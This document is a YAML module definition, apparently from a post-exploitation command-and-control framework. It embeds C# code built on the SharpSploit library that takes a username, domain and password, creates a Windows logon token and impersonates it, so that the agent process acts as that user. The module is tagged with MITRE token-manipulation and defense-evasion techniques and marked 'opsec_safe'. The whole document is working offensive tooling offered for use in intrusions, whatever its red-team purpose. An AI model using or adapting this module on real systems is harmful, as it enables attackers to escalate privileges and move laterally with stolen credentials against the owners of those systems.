name: MakeToken
authors:
  - name: Anthony Rose
    handle: Cx01N
    link: https://twitter.com/Cx01N_
description: |
  Makes a new token with a specified username and password, and stores
  it for cleanup. It then impersonates the token to allow the current agent process
  to then take actions as if it were the user that was authenticated via the new token.
  Leverages LogonUserA to authenticate the token and ImpersonateLoggedOnUser to allow
  the agent process to impersonate the user.
software: ''
tactics: [TA0004, TA0005]
techniques: [T1134.003]
background: false
output_extension: ''
needs_admin: false
opsec_safe: true
language: csharp
min_language_version: ''
options:
  - name: Username
    description: Username to authenticate as.
    required: true
    value: username1
    strict: false
    suggested_values: []
  - name: Domain
    description: Domain to authenticate the user to.
    required: true
    value: DOMAIN
    strict: false
    suggested_values: []
  - name: Password
    description: Password to authenticate the user.
    required: true
    value: Password123
    strict: false
    suggested_values: []
  - name: LogonType
    description: LogonType to use. Defaults to LOGON32_LOGON_NEW_CREDENTIALS, which
      is suitable to perform actions that require remote authentication. LOGON32_LOGON_INTERACTIVE
      is suitable for local actions.
    required: false
    value: LOGON32_LOGON_NEW_CREDENTIALS
    strict: false
    suggested_values: []
csharp:
  UnsafeCompile: false
  CompatibleDotNetVersions:
    - Net35
    - Net40
  Code: |
    using System;
    using System.IO;
    using SharpSploit.Credentials;
    using SharpSploit.Execution;

    public static class Program
    {
        public static void Main(string[] args)
        {
            string username = args.Length > 0 ? args[0] : "";
            string domain = args.Length > 1 ? args[1] : "";
            string password = args.Length > 2 ? args[2] : "";
            string logonType = args.Length > 3 ? args[3] : "LOGON32_LOGON_NEW_CREDENTIALS";

            string result = MakeToken(username, domain, password, logonType);
            Console.WriteLine(result);
        }

        public static string MakeToken(string username, string domain, string password, string logonType = "LOGON32_LOGON_NEW_CREDENTIALS")
        {
            using (StringWriter stringWriter = new StringWriter())
            {
                try
                {
                    using (Tokens t = new Tokens())
                    {
                        Win32.Advapi32.LOGON_TYPE lt = Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS;
                        switch (logonType.ToUpper())
                        {
                            case "LOGON32_LOGON_INTERACTIVE":
                                lt = Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_INTERACTIVE;
                                break;
                            case "LOGON32_LOGON_NETWORK":
                                lt = Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_NETWORK;
                                break;
                            case "LOGON32_LOGON_BATCH":
                                lt = Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_BATCH;
                                break;
                            case "LOGON32_LOGON_SERVICE":
                                lt = Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_SERVICE;
                                break;
                            case "LOGON32_LOGON_UNLOCK":
                                lt = Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_UNLOCK;
                                break;
                            case "LOGON32_LOGON_NETWORK_CLEARTEXT":
                                lt = Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_NETWORK_CLEARTEXT;
                                break;
                            case "LOGON32_LOGON_NEW_CREDENTIALS":
                                lt = Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS;
                                break;
                            default:
                                return "MakeToken failed. Invalid LogonType specified.";
                        }

                        if (t.MakeToken(username, domain, password, lt))
                        {
                            stringWriter.WriteLine("Successfully made and impersonated token for user: " + domain + "\\\\" + username);
                        }
                        else
                        {
                            stringWriter.WriteLine("Failed to make token for user: " + domain + "\\\\" + username);
                        }
                    }
                }
                catch (Exception e)
                {
                    stringWriter.WriteLine(e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
                }

                return stringWriter.ToString();
            }
        }
    }
  ReferenceSourceLibraries:
    - Name: SharpSploit
      Description: SharpSploit is a library for C# post-exploitation modules.
      Location: SharpSploit\SharpSploit\
      Language: CSharp
      CompatibleDotNetVersions:
        - Net35
        - Net40
      ReferenceAssemblies:
        - Name: System.Management.Automation.dll
          Location: net35\System.Management.Automation.dll
          DotNetVersion: Net35
        - Name: System.Management.dll
          Location: net40\System.Management.dll
          DotNetVersion: Net40
        - Name: System.Management.Automation.dll
          Location: net40\System.Management.Automation.dll
          DotNetVersion: Net40
        - Name: System.IdentityModel.dll
          Location: net40\System.IdentityModel.dll
          DotNetVersion: Net40
        - Name: System.dll
          Location: net40\System.dll
          DotNetVersion: Net40
        - Name: System.DirectoryServices.dll
          Location: net40\System.DirectoryServices.dll
          DotNetVersion: Net40
        - Name: System.Core.dll
          Location: net40\System.Core.dll
          DotNetVersion: Net40
        - Name: mscorlib.dll
          Location: net40\mscorlib.dll
          DotNetVersion: Net40
        - Name: System.Management.dll
          Location: net35\System.Management.dll
          DotNetVersion: Net35
        - Name: mscorlib.dll
          Location: net35\mscorlib.dll
          DotNetVersion: Net35
        - Name: System.Core.dll
          Location: net35\System.Core.dll
          DotNetVersion: Net35
        - Name: System.DirectoryServices.dll
          Location: net35\System.DirectoryServices.dll
          DotNetVersion: Net35
        - Name: System.dll
          Location: net35\System.dll
          DotNetVersion: Net35
        - Name: System.IdentityModel.dll
          Location: net35\System.IdentityModel.dll
          DotNetVersion: Net35
      EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
